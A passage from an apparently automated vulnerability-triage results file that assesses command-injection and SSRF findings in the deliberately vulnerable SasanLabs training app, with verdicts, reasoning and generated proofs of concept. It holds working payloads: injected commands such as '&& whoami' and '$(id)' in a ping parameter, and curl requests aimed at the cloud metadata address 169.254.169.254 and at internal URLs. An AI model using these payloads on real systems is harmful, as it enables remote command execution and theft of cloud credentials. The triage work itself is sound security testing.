+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Command Injection",
+      "cwe": "CWE-78",
+      "source": "@RequestParam(IP_ADDRESS) String ipAddress",
+      "sink": "new ProcessBuilder(new String[]{\"cmd\",\"/c\",\"ping -n 2 \"+ipAddress})",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter ipAddress is validated against an IPv4 regex and a check for \"%3B\". The boolean result of this validation (validator.get()) is passed to getResponseFromPingCommand. When the validation fails (i.e., the input does NOT match the IP pattern), the code takes the else branch, which concatenates the raw ipAddress into a command string passed to ProcessBuilder. An attacker can supply a non\u2011IP string such as \"1.2.3.4 && whoami\" which fails the regex, causing the unsafe branch to execute and resulting in command injection. The existing validation is therefore bypassable and does not prevent exploitation, making the finding a true command\u2011injection vulnerability.",
+      "evidence": [
+        "Source: @RequestParam(IP_ADDRESS) String ipAddress is attacker\u2011controlled.",
+        "Validator checks IP_ADDRESS_PATTERN and absence of \"%3B\" and returns a boolean.",
+        "If validator.get() is false, getResponseFromPingCommand builds a ProcessBuilder with the raw ipAddress concatenated to the ping command.",
+        "The else branch (executed on validation failure) directly reaches the sink ProcessBuilder without further sanitization."
+      ],
+      "poc": "Send a request to the endpoint with ipAddress=1.2.3.4%20&&%20whoami (or any non\u2011IP payload). The validation will fail, the else branch will execute, and the server will run \"ping -n 2 1.2.3.4 && whoami\", demonstrating command injection.",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 3184,
+      "retry_count": 1,
+      "parse_success": true,
+      "generated_poc": {
+        "poc_type": "cURL Command",
+        "payload": "curl \"http://localhost:8080/command-injection/level3?ipAddress=127.0.0.1$(id)\"",
+        "instructions": "Run the curl command. If the endpoint is vulnerable, the server will execute the injected $(id) command and the HTTP response will include the output of the 'id' command alongside the ping output."
+      }
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 206
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 207
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 208
+        },
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "urlConnection",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "URLConnection urlConnection = u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()",
+        "<VAR_6>",
+        "<VAR_7><VAR_6>=<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "fc25823929fa2b916d80406e9f4ef2a40aa8e18e377e7b3eb37d52c122eb3b83",
+      "context_hash": "b840f183b19ea34afed47921c287e7b646baa433678a74faf8a967459cc5df4c",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 206,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Server Side Request Forgery",
+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url",
+      "sink": "URLConnection.openConnection() / read InputStream",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter is only processed when it exactly matches the constant `gistUrl` (case\u2011insensitive). This whitelist check is a strict equality comparison, preventing an attacker from supplying an arbitrary URL. Subsequent `isUrlValid` only validates syntax and does not broaden the allowed set. Because the only reachable sink is guarded by this robust whitelist, the reported SSRF cannot be exploited.",
+      "evidence": [
+        "Line 207\u2011209: `if (gistUrl.equalsIgnoreCase(url)) { return getGenericVulnerabilityResponseWhenURL(url); } else { return this.invalidUrlResponse(); }`",
+        "Method `getGenericVulnerabilityResponseWhenURL` creates a `URL` object only after the whitelist check",
+        "`MetaDataServiceMock.isPresent(u)` further restricts to known internal IPs, but the primary protection is the equality check",
+        "Sink occurs in `getResponseForURLConnection` where `u.openConnection()` is called"
+      ],
+      "poc": "N/A \u2013 the endpoint only accepts the exact `gistUrl`; any other value results in an error response, so no SSRF can be triggered.",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 36518,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 132
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 133
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 133
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 133
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 135
+        },
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "urlConnection",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "URLConnection urlConnection = u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()",
+        "<VAR_6>",
+        "<VAR_7><VAR_6>=<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "130b3055fbaf432d4cfe38a0eac7b1ff0c6933a10ac2631f8a46726d25c56149",
+      "context_hash": "772466f2e95127481fe59fc20a7fd60c678cfd716b7ceb292a0dec6b0db422d8",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 132,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Server Side Request Forgery",
+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url (HTTP request parameter)",
+      "sink": "URLConnection.openConnection() followed by reading InputStream",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter 'url' is passed through a syntactic validator (isUrlValid) that only checks URL format and blocks the 'file:' protocol. No host\u2011allowlist or protocol restriction beyond that is applied before the URL is opened. Consequently an attacker can supply an internal HTTP URL (e.g., http://127.0.0.1:8080/secret) which will be fetched via URLConnection, leading to SSRF. The check against MetaDataServiceMock.isPresent only affects a separate branch and does not prevent the vulnerable else\u2011branch from executing.",
+      "evidence": [
+        "Source method getVulnerablePayloadLevel2 receives the 'url' request parameter.",
+        "isUrlValid(url) only validates URL syntax and blocks 'file:' protocol.",
+        "If the URL passes validation, getGenericVulnerabilityResponseWhenURL(url) is called.",
+        "Inside getGenericVulnerabilityResponseWhenURL, after another isUrlValid check, a new URL object is created.",
+        "If MetaDataServiceMock.isPresent(u) is false, the code calls getResponseForURLConnection(u).",
+        "getResponseForURLConnection opens a URLConnection to the supplied URL and reads its response."
+      ],
+      "poc": "GET /vulnerable/ssrf?url=http://127.0.0.1:8080/secret HTTP/1.1",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 36255,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "poc_type": "cURL Command",
+        "payload": "curl \\\"http://localhost:8080/Level2?url=http://169.254.169.254/latest/meta-data/\\\"",
+        "instructions": "Execute the command against the vulnerable endpoint. If the SSRF is exploitable, the server will request the internal metadata service (http://169.254.169.254/latest/meta-data/) and return its response in the HTTP body."
+      }
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 159
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 160
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 160
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 160
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 161
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 164
+        },
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "13a7757922e5fff1cd3cff3a409a14375d96a3a02ad5587cd74aaafd1c0eb15a",
+      "context_hash": "d40382bc1d1221e44db335b79d513d1d7da29b13b3282c9e7d27da527d7de44b",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 159,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 187,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Server Side Request Forgery (SSRF)",
+      "cwe": "CWE-918",
+      "source": "@RequestParam(FILE_URL) String url",
+      "sink": "URLConnection.openConnection() followed by reading the response",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter 'url' is attacker-controlled. The code only validates that the string can be parsed as a URL and blocks the 'file://' protocol and a single hard\u2011coded internal IP (169.254.169.254). All other URLs, including those pointing to internal services or other protocols (http, https), are allowed and eventually passed to URLConnection.openConnection(), which performs an outbound network request. The validation is weak and bypassable, so the SSRF vulnerability is exploitable.",
+      "evidence": [
+        "Source: @RequestParam(FILE_URL) String url in getVulnerablePayloadLevel3",
+        "Validation: isUrlValid(url) checks syntactic validity and !url.startsWith(FILE_PROTOCOL)",
+        "Blocklist: explicit check against host 169.254.169.254",
+        "If MetaDataServiceMock.isPresent(u) is false, code calls getResponseForURLConnection(u) which opens the URL connection",
+        "Sink: URLConnection urlConnection = u.openConnection(); reading from urlConnection.getInputStream()"
+      ],
+      "poc": "Send a request to /vulnerable/level3?url=http://internal-service.local/secret to have the server fetch the internal resource and return its contents in the response.",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 34480,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "poc_type": "cURL Command",
+        "payload": "curl -G \\\"http://localhost:8080/ssrf/level3\\\" --data-urlencode \\\"url=http://127.0.0.1:8080/secret\\\"",
+        "instructions": "Send this request to the vulnerable endpoint. The server will fetch the content from the internal URL (e.g., http://127.0.0.1:8080/secret) and return it in the response, demonstrating the SSRF vulnerability."
+      }
+    },
+    {
+      "category": "ssrf",
+      "subtype": "CWE-918",
+      "path": [
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 108
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 109
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 109
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "@RequestParam(FILE_URL) String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 64
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "String url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 46
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 48
+        },
+        {
+          "code": "String url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 66
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 67
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "URL url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 168
+        },
+        {
+          "code": "url",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\MetaDataServiceMock.java",
+          "line": 169
+        },
+        {
+          "code": "URL url",
+          "file": "unknown",
+          "line": -1
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 68
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 76
+        },
+        {
+          "code": "URL u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 84
+        },
+        {
+          "code": "u",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "urlConnection",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        },
+        {
+          "code": "URLConnection urlConnection = u.openConnection()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "line": 85
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_3>",
+        "<VAR_3>",
+        "<VAR_5><VAR_3>",
+        "<VAR_4>",
+        "<VAR_4>",
+        "<VAR_5><VAR_4>",
+        "<VAR_4>",
+        "<VAR_4>.<ATTR_1>()",
+        "<VAR_6>",
+        "<VAR_7><VAR_6>=<VAR_4>.<ATTR_1>()"
+      ],
+      "fingerprint": "2a2a94fc38dd435e1ce9e6b82c73b5b1a298636e7bfc4146dba487ea92907b64",
+      "context_hash": "b6dd139536be7a098c67c090c3e7dd7e6d869f2f646ed5d9cbcbfb4660fe9f7f",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "source_line": 108,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\ssrf\\SSRFVulnerability.java",
+          "sink_line": 85
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.93,
+      "vulnerability_type": "Server Side Request Forgery (SSRF)",
